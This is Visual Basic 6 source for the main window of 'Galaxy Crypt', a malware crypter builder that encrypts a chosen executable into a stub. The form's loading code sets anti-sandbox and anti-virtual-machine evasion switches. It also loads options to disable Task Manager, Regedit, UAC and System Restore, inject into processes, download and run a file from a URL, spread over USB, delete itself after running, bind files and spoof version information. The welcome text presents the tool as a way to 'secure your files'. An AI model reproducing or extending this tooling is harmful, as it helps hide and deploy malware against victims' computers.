VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.0#0"; "Codejock.Controls.v13.0.0.ocx"
Begin VB.Form Main 
   BorderStyle     =   0  'None
   Caption         =   "Galaxy Crypter"
   ClientHeight    =   6000
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   11250
   Icon            =   "Main.frx":0000
   LinkTopic       =   "Form1"
   Picture         =   "Main.frx":F172
   ScaleHeight     =   6000
   ScaleWidth      =   11250
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox Text1 
      BackColor       =   &H80000007&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFF80&
      Height          =   3255
      Left            =   600
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "Main.frx":13B67
      Top             =   1560
      Width           =   3735
   End
   Begin XtremeSuiteControls.FlatEdit txtbrowse 
      Height          =   300
      Left            =   4680
      TabIndex        =   1
      Top             =   2040
      Width           =   4335
      _Version        =   851968
      _ExtentX        =   7646
      _ExtentY        =   520
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "Click to browse all files..."
      BackColor       =   -2147483641
      Alignment       =   2
      Locked          =   -1  'True
      Appearance      =   1
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit1 
      Height          =   300
      Left            =   4680
      TabIndex        =   4
      Top             =   4440
      Width           =   4335
      _Version        =   851968
      _ExtentX        =   7646
      _ExtentY        =   529
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "Locate a stub file..."
      BackColor       =   -2147483641
      Alignment       =   2
      Locked          =   -1  'True
      Appearance      =   1
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.FlatEdit txtgenerate 
      Height          =   300
      Left            =   4680
      TabIndex        =   2
      Top             =   3240
      Width           =   4335
      _Version        =   851968
      _ExtentX        =   7646
      _ExtentY        =   520
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "Select a file to proceed..."
      BackColor       =   -2147483641
      Alignment       =   2
      Appearance      =   1
      UseVisualStyle  =   0   'False
   End
   Begin VB.Image Image34 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":13B6D
      Top             =   3840
      Width           =   1905
   End
   Begin VB.Image Image33 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":17EE7
      Top             =   3840
      Width           =   1905
   End
   Begin VB.Image Image30 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":1C375
      Top             =   4920
      Width           =   1905
   End
   Begin VB.Image Image29 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":20B20
      Top             =   4920
      Width           =   1905
   End
   Begin XtremeSuiteControls.CommonDialog CDStub 
      Left            =   240
      Top             =   720
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.Label Label7 
      Height          =   375
      Left            =   120
      TabIndex        =   3
      Top             =   120
      Width           =   9975
      _Version        =   851968
      _ExtentX        =   17595
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Galaxy Crypt Private Edition. Registered To: Username Here"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Simplified Arabic Fixed"
         Size            =   14.25
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin VB.Image Image28 
      Height          =   390
      Left            =   1560
      Picture         =   "Main.frx":25540
      Top             =   840
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image27 
      Height          =   390
      Left            =   1560
      Picture         =   "Main.frx":29D24
      Top             =   840
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image26 
      Height          =   390
      Left            =   2520
      Picture         =   "Main.frx":2EACC
      Top             =   5160
      Width           =   1905
   End
   Begin VB.Image Image25 
      Height          =   390
      Left            =   2520
      Picture         =   "Main.frx":334EB
      Top             =   5160
      Width           =   1905
   End
   Begin VB.Image Image24 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":382CD
      Top             =   3840
      Width           =   1905
   End
   Begin VB.Image Command1 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":3C91E
      Top             =   3840
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image23 
      Height          =   285
      Left            =   10845
      Picture         =   "Main.frx":4162A
      Top             =   20
      Width           =   420
   End
   Begin VB.Image Image22 
      Height          =   285
      Left            =   10400
      Picture         =   "Main.frx":44A35
      Top             =   20
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.Image Image21 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":47BAA
      Top             =   5040
      Width           =   1905
   End
   Begin VB.Image Image20 
      Height          =   390
      Left            =   480
      Picture         =   "Main.frx":4C06C
      Top             =   5160
      Width           =   1905
   End
   Begin VB.Image Image19 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":50512
      Top             =   5040
      Width           =   1905
   End
   Begin VB.Image Image18 
      Height          =   390
      Left            =   480
      Picture         =   "Main.frx":54DB6
      Top             =   5160
      Width           =   1905
   End
   Begin VB.Image Image12 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":596D1
      Top             =   1440
      Width           =   1905
   End
   Begin VB.Image Image11 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":5DFE8
      Top             =   2640
      Width           =   1905
   End
   Begin VB.Image Image7 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":622B6
      Top             =   2640
      Width           =   1905
   End
   Begin VB.Image Image17 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":668AA
      Top             =   4440
      Width           =   1905
   End
   Begin VB.Image Image16 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":6AADA
      Top             =   4440
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image15 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":6F079
      Top             =   840
      Width           =   1905
   End
   Begin VB.Image Image14 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":732E9
      Top             =   840
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image10 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":777C2
      Top             =   2040
      Width           =   1905
   End
   Begin VB.Image Image9 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":7BC51
      Top             =   2040
      Width           =   1905
   End
   Begin VB.Image Image8 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":804F0
      Top             =   1440
      Width           =   1905
   End
   Begin VB.Image Image13 
      Height          =   285
      Left            =   10845
      Picture         =   "Main.frx":85291
      Top             =   20
      Width           =   420
   End
   Begin VB.Image Image5 
      Height          =   285
      Left            =   10400
      Picture         =   "Main.frx":88689
      Top             =   20
      Width           =   420
   End
   Begin VB.Image Image4 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":8B70C
      Top             =   3240
      Width           =   1905
   End
   Begin VB.Image Image3 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":8F57F
      Top             =   2640
      Width           =   1905
   End
   Begin VB.Image Image2 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":93A3F
      Top             =   2640
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image1 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":98364
      Top             =   1440
      Width           =   1905
   End
   Begin XtremeSuiteControls.CommonDialog CD1 
      Left            =   4680
      Top             =   1800
      _Version        =   851968
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin VB.Image CmdSearch 
      Height          =   390
      Left            =   6000
      Picture         =   "Main.frx":9C801
      Top             =   1440
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Image6 
      Height          =   390
      Left            =   9120
      Picture         =   "Main.frx":A10C1
      Top             =   3240
      Visible         =   0   'False
      Width           =   1905
   End
   Begin VB.Image Background 
      Height          =   6000
      Left            =   0
      Picture         =   "Main.frx":A50D3
      Top             =   0
      Width           =   11250
   End
End
Attribute VB_Name = "Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
Private SettedX As Integer, SettedY As Integer, Dragging As Boolean

Public Var1 As Integer, Keyset As String

Private Sub Background_Click()
    text1.SetFocus
    If text1.Text = vbNullString Then
    text1.Text = "            Welcome to Galaxy Crypt" & vbCrLf & vbCrLf & _
    "With our friendly user interface, smooth and quick processing, you can secure your files without unwanted hassle or advanced learning. Enjoy your time, and please, be sure to leave us feedback and report any bugs or issues using our feedback option."
    End If
    
    m_cancel = True
    Credits.Command1.Visible = False
    Credits.Image3.Visible = True
    Credits.Command1.Visible = False
    
    Call mciSendString("pause MyAlias", 0, 0, 0)

End Sub

Private Sub CmdSearch_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Image1.Visible = True
    CmdSearch.Visible = False
End Sub

Private Sub CmdSearch_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    On Local Error Resume Next
    
    Image1.Visible = False
    CmdSearch.Visible = True
    
    DoEvents
    
    With CD1
    
    .DialogTitle = "Select a file to proceed..."
    .DefaultExt = "EXE Files (*.exe |*.exe"
    .Filter = "Exe Files (*.exe |*.exe"
    .ShowOpen
    
    Dim Filename() As String
    If .Filename <> vbNullString Then
         Filename = Split(CD1.Filename, "\")
        
    txtbrowse.Text = .Filename
    
    text1.FontSize = 8
    If InStr(text1.Text, "With our friendly") Then
    text1.Text = vbNullString
    End If
    
    DoEvents
    
    text1.Text = text1.Text & Time & vbCrLf
    text1.Text = text1.Text & "File Selected" & vbCrLf
    text1.Text = text1.Text & "File Name: " & Filename(UBound(Filename)) & vbCrLf
    text1.Text = text1.Text & "Size of uncrypted data: " & FormatKB(FileLen(CD1.Filename)) & vbCrLf
    text1.Text = text1.Text & "EOF Data: " & Len(ReadEOFData(CD1.Filename)) & " Bytes" & vbCrLf & vbCrLf
    
    Dim i As Integer
    For i = 1 To 13
    StatisticsLog (i)
    Next i
    
    End If
        
    If Main.CD1.Filename <> vbNullString Then
    Settings.LblEOF.Caption = "EOF Data: " & Len(ReadEOFData(.Filename)) & " Bytes"
    
    If Len(ReadEOFData(.Filename)) > 0 Then Settings.CheckBox2.Value = xtpChecked
    If Len(ReadEOFData(.Filename)) = 0 Then Settings.CheckBox2.Value = xtpUnchecked
    
    Else
    Settings.LblEOF.Caption = "EOF Data: N/A "
    End If
    End With
    
    Build.text1.Visible = True
    Image28.Visible = True
    
End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image24.Visible = False
Command1.Visible = True
End Sub

Private Sub form_load()

    On Local Error Resume Next
    
    Set ShowTsk = New ShwTskBar
    Set ShowTsk.Client = Me
    ShowTsk.ShowInTaskbar = True
    
    
    FlatEdit1.Text = "Click to locate custom stub..."
    Image29.Visible = False
    
    'Antis
    AntiSandbox = 1
    AntiVirtPC = 1
    AntiVirtBox = 1
    AntiVmWare = 1
    AntiAnubis = 0
    AntiJoeBox = 0
    AntiCws = 0
    AntiSunbelt = 0
    AntiPanda = 0
    AntiThreat = 0
    DownLoadFile = 0
    'Stealth
     DisableSystemRestore = 0
     DisableMsconfig = 0
     DisableStart = 0
     DisableRegEdit = 0
     DisableTaskMgr = 0
     DisableUAC = 0
    ' Fake Message
     Message_Play = ""
     Message_Title = ""
     Message_Body = ""            ' 5
     Message_Icon = 0
     Message_Options = ""
    
    Call RandomKey
    Encryption_Key = txtgenerate.Text
    text1.Alignment = vbLeftJustify
    text1.Text = "            Welcome to Galaxy Crypt" & vbCrLf & vbCrLf & _
    "With our friendly user interface, smooth and quick processing, you can secure your files without unwanted hassle or advanced learning. Enjoy your time, and please, be sure to leave us feedback and report any bugs or issues using our feedback option."
    
    
    User_Data = Main.FlatEdit1.Text
    
        If ReadIniValue(App.Path & "\settings.ini", "settings", "Remember Settings") = "1" Then
    
    
            Dim MsgIndex As Integer
        
            MsgIndex = ReadIniValue(App.Path & "\settings.ini", "Settings", "Message Body")
            Message.List1.ListIndex = Replace(MsgIndex, """", "")
            Call Message.List1_MouseDown(1, 1, 1, 1)
            
            MsgIndex = ReadIniValue(App.Path & "\settings.ini", "Settings", "Delay Runtime")
            Settings.CBDelay.ListIndex = Replace(MsgIndex, """", "")
            
            MsgIndex = ReadIniValue(App.Path & "\settings.ini", "settings", "Inject")
            Stealth.ComboBox1.ListIndex = Replace(MsgIndex, """", "")
                
            WebGet.TxtURL.Text = ReadIniValue(App.Path & "\settings.ini", "settings", "Download URL")
            
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Enable Download") = "1" Then WebGet.CheckBox9.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Enable Message") = "1" Then Message.CheckBox7.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Play Message") = "1" Then Message.CheckBox8.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Remember Settings") = "1" Then Settings.ChkRecord.Value = xtpChecked
            Stealth.Text3.Text = Replace(ReadIniValue(App.Path & "\settings.ini", "settings", "Add Bytes"), """", "")
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Enable Bytes") = "1" Then Stealth.CheckBox7.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Regedit") = "1" Then Stealth.CheckBox6.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Task Mgr") = "1" Then Stealth.CheckBox4.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "System Restore") = "1" Then Stealth.CheckBox2.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Start Button") = "1" Then Stealth.CheckBox3.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "MsConfig") = "1" Then Stealth.CheckBox1.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "UAC") = "1" Then Stealth.CheckBox5.Value = xtpChecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Melt") = "1" Then Settings.CheckBox4.Value = xtpChecked Else Settings.CheckBox4.Value = xtpUnchecked
            If ReadIniValue(App.Path & "\settings.ini", "settings", "USB") = "1" Then Settings.CheckBox10.Value = xtpChecked Else Settings.CheckBox10.Value = xtpUnchecked
            
            WebGet.FlatEdit1.Text = ReadIniValue(App.Path & "\settings.ini", "settings", "DlFile")
            WebGet.Text5.Text = ReadIniValue(App.Path & "\settings.ini", "settings", "DlExt")
            WebGet.FlatEdit3.Text = ReadIniValue(App.Path & "\settings.ini", "settings", "DlDelay")
            WebGet.Com1.ListIndex = ReadIniValue(App.Path & "\settings.ini", "settings", "DlDelayTime")
            If ReadIniValue(App.Path & "\settings.ini", "settings", "DlInjExt") = "1" Then WebGet.checkbox12.Value = True Else WebGet.checkbox12.Value = False
            
            If ReadIniValue(App.Path & "\settings.ini", "settings", "Version Info") <> "" Then _
            Call VersionInfo.ReadVersionInformation(ReadIniValue(App.Path & "\settings.ini", "settings", "Version Info"), False)
            If Build.Fileexists(ReadIniValue(App.Path & "\Settings.ini", "Settings", "Stub")) Then Main.FlatEdit1.Text = ReadIniValue(App.Path & "\Settings.ini", "Settings", "Stub")
        Else
        End If

End Sub


Private Sub Background_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Image1.Visible = True
    CmdSearch.Visible = False
    Image2.Visible = False
    Image3.Visible = True
    Image6.Visible = False
    Image13.Visible = False
    Image23.Visible = True
    Image4.Visible = True
    Image14.Visible = False
    Image22.Visible = False
    Image5.Visible = True
    Image15.Visible = True
    Image9.Visible = False
    Image10.Visible = True
    Image7.Visible = False
    Image11.Visible = True
    Image16.Visible = False
    Image17.Visible = True
    Image8.Visible = False
    Image12.Visible = True
    Image19.Visible = False
    Image21.Visible = True
    Image24.Visible = True
    Command1.Visible = False
    Image29.Visible = False
    Image30.Visible = True
    Image33.Visible = False
    Image34.Visible = True
    Image25.Visible = False
    Image26.Visible = True
     If Dragging Then
            Me.Left = Me.Left + (X - SettedX)
            Me.Top = Me.Top + (Y - SettedY)
        End If
End Sub

Private Sub Background_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    SettedX = X
    SettedY = Y
    Dragging = True
End Sub

Private Sub Background_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Dragging = False
End Sub

Private Sub Image1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image1.Visible = False
CmdSearch.Visible = True
End Sub


Private Sub Image10_Click()
Settings.Show
End Sub

Private Sub Image10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image9.Visible = True
Image10.Visible = False
End Sub

Private Sub Image11_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image7.Visible = True
Image11.Visible = False
End Sub

Private Sub Image12_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image8.Visible = True
Image12.Visible = False
End Sub

Private Sub Image13_Click()
SystemParametersInfo SPI_SETCURSORS, 0&, ByVal 0&, (SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
 End
End Sub

Private Sub Image13_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image22.Visible = False
End Sub

Private Sub Image14_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image15.Visible = True
Image14.Visible = False
End Sub

Private Sub Image14_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image15.Visible = True
Image14.Visible = False
Antis.Show
End Sub

Private Sub Image15_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image14.Visible = True
Image15.Visible = False
End Sub
Private Sub Image16_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image17.Visible = True
Image16.Visible = False
End Sub

Private Sub Image16_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image17.Visible = False
Image16.Visible = True
Build.Show
Build.WindowState = vbNormal
End Sub

Private Sub Image17_Mousemove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image16.Visible = True
Image17.Visible = False
End Sub

Private Sub Image18_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Cont_Play_Song = 1
Image20.Visible = True
Image18.Visible = False
End Sub

Private Sub Image18_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image20.Visible = False
Image18.Visible = True
CdPlay = True

Credits.Show
Call RunMain(Credits.Picture1, Credits)
Main.SetFocus
End Sub
Private Sub MP3_Stop(ByVal sAlias As String)
mciSendString "stop " & sAlias, 0, 0, 0
mciSendString "close " & sAlias, 0, 0, 0
End Sub

Private Sub Image19_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image21.Visible = True
Image19.Visible = False
End Sub

Private Sub Image19_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image21.Visible = False
Image19.Visible = True
Main.Visible = False
Antis.Visible = False
Settings.Visible = False
Build.Visible = False
Message.Visible = False
Credits.Visible = False
Binder.Visible = False
Login.Visible = True
End Sub

Private Sub Image2_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Visible = True
Image2.Visible = False
End Sub

Private Sub Image2_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Visible = False
Image2.Visible = True
RandomKey

If InStr(text1.Text, "With our friendly") Then
text1.Text = vbNullString
End If
text1.FontSize = 8
text1.Text = text1.Text & Time & vbCrLf
text1.Text = text1.Text & "Random Key Generated" & vbCrLf
text1.Text = text1.Text & "Key: " & txtgenerate.Text & vbCrLf & vbCrLf

Image28.Visible = True
End Sub

Private Sub Image20_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image18.Visible = True
Image20.Visible = False
End Sub
Private Sub Image21_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image19.Visible = True
Image21.Visible = False
End Sub

Private Sub Image22_Click()
Me.WindowState = vbMinimized
End Sub

Private Sub Image22_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image13.Visible = False
End Sub

Private Sub Image23_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image13.Visible = True
Image5.Visible = True
Image23.Visible = False
End Sub

Private Sub Command1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.Visible = False
Image24.Visible = True
End Sub

Private Sub Image24_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.Visible = True
Image24.Visible = False
End Sub

Private Sub Command1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.Visible = True
Image24.Visible = False
VersionInfo.Show
End Sub

Private Sub Image25_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image26.Visible = True
Image25.Visible = False
End Sub

Private Sub Image25_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image26.Visible = False
Image25.Visible = True
Bugs.Show
End Sub

Private Sub Image26_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image25.Visible = True
Image26.Visible = False
End Sub

Private Sub Image27_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image27.Visible = False
Image28.Visible = True
End Sub

Private Sub Image27_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
text1.Text = vbNullString
Image27.Visible = False
Image28.Visible = False
End Sub

Private Sub Image28_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image27.Visible = True
Image28.Visible = False
End Sub

Private Sub Image29_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image30.Visible = True
Image29.Visible = False
End Sub

Private Sub Image29_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)

Updates.Show

End Sub

Private Sub Image3_Click()
RandomKey
End Sub
Private Function RandomNumber() As Integer

' Generate Random Key:
Randomize
Var1 = Int(9 * Rnd)
RandomNumber = Var1
End Function

Private Function RandomLetter() As String

' Generate Random Key:
anfang:
Keyset = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz"
Randomize
Var1 = Int(52 * Rnd)
If Var1 = 0 Then GoTo anfang
RandomLetter = Mid(Keyset, Var1, 1)
End Function

Private Function Random_Symbol() As String
Redo:

Keyset = "!@#$%^&*()-+~?><:{}"
Randomize

Var1 = Int(20 * Rnd)
If Var1 = 0 Then GoTo Redo
Random_Symbol = Mid(Keyset, Var1, 1)

End Function
Private Function RandomKey()
Dim i As Integer
' Generate Random Key:
txtgenerate.Text = ""
For i = 1 To 30
If i = 2 Or i = 6 Or i = 12 Or i = 16 Or i = 21 Or i = 4 Or i = 8 Or i = 10 Then
txtgenerate.Text = txtgenerate.Text & RandomNumber
ElseIf i = 1 Or i = 7 Or i = 9 Or i = 18 Or i = 28 Or i = 22 Or i = 29 Or i = 19 Or i = 30 Or i = 3 Or i = 13 Or i = 24 Or i = 26 Then
txtgenerate.Text = txtgenerate.Text & RandomLetter
Else
txtgenerate.Text = txtgenerate.Text & Random_Symbol
End If
Next i

End Function

Private Sub Image3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Visible = True
Image3.Visible = False
End Sub

Private Sub Image30_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image29.Visible = True
Image30.Visible = False
End Sub

Private Sub Image33_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image34.Visible = True
Image33.Visible = False
End Sub

Private Sub Image33_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)

Image34.Visible = False
Image33.Visible = True

  With CDStub
        .DialogTitle = "Locate a custom stub..."
        .DefaultExt = "EXE Files (*.exe |*.exe"
        .Filter = "Exe Files (*.exe |*.exe"
        .ShowOpen
    End With
    
    If CDStub.Filename <> vbNullString Then
        FlatEdit1.Text = CDStub.Filename
        User_Data = FlatEdit1.Text
        VersionInfo.ReadVersionInformation User_Data, True
    Else
    End If
    
End Sub

Private Sub Image34_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image33.Visible = True
Image34.Visible = False
End Sub

Private Sub Image5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image22.Visible = True
Image5.Visible = False
Image10.Visible = True
Image23.Visible = True
End Sub

Private Sub Image4_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image6.Visible = True
Image4.Visible = False
End Sub

Private Sub Image6_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = True
Image6.Visible = False
End Sub

Private Sub Image6_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = False
Image6.Visible = True

Binder.Show
End Sub

Private Sub Image7_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image11.Visible = True
Image7.Visible = False
End Sub

Private Sub Image7_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image11.Visible = False
Image7.Visible = True
Stealth.Show
End Sub
Private Sub Image8_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image12.Visible = True
Image8.Visible = False
End Sub

Private Sub Image8_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image12.Visible = False
Image8.Visible = True
Message.Show
End Sub
Private Sub Image9_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image10.Visible = True
Image8.Visible = False
End Sub

Private Sub Image9_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image10.Visible = False
Image8.Visible = True
Settings.Show
End Sub


Private Sub Label7_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  SettedX = X
    SettedY = Y
    Dragging = True
End Sub

Private Sub Label7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Dragging Then
        Me.Left = Me.Left + (X - SettedX)
        Me.Top = Me.Top + (Y - SettedY)
    End If
End Sub

Private Sub Label7_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dragging = False
End Sub

Private Sub Text1_Change()

text1.SelStart = Len(text1.Text)
If InStr(text1.Text, "With our friendly") <> 0 Then
text1.FontSize = 10
Image28.Visible = False
Else
Image28.Visible = True
End If
End Sub

Public Sub StatisticsLog(ByVal StatMsgNumber As Integer)
    Dim StatMessage(50) As String, Filename() As String
    Filename = Split(CD1.Filename, "\")
    
    StatMessage(1) = "Original Filename: " & Filename(UBound(Filename))
    StatMessage(2) = "Size of uncrypted data: " & FormatKB(FileLen(CD1.Filename))
    StatMessage(3) = "End of file data found: " & Len(ReadEOFData(CD1.Filename)) & " Bytes"
    StatMessage(4) = vbCrLf & "File Version: " & VersionInfo.text1.Text
    StatMessage(5) = "File Desccription: " & VersionInfo.Text2.Text
    StatMessage(6) = "Legal Copyright: " & VersionInfo.Text3.Text
    StatMessage(7) = "Comments: " & VersionInfo.Text4.Text
    StatMessage(8) = "Company Name: " & VersionInfo.Text5.Text
    StatMessage(9) = "Legal Trademarks: " & VersionInfo.Text6.Text
    StatMessage(10) = "Product Name: " & VersionInfo.Text7.Text
    StatMessage(11) = "Product Version: " & VersionInfo.Text8.Text
    StatMessage(12) = "Contact: " & VersionInfo.Text9.Text
    StatMessage(13) = "Internal Name: " & VersionInfo.Text10.Text
    
    With Statistics.Text5
    .Text = .Text & vbCrLf
    .Text = .Text & StatMessage(StatMsgNumber)
    End With

End Sub


Private Sub txtbrowse_Click()
Call CmdSearch_MouseUp(1, 1, 1, 1)
End Sub

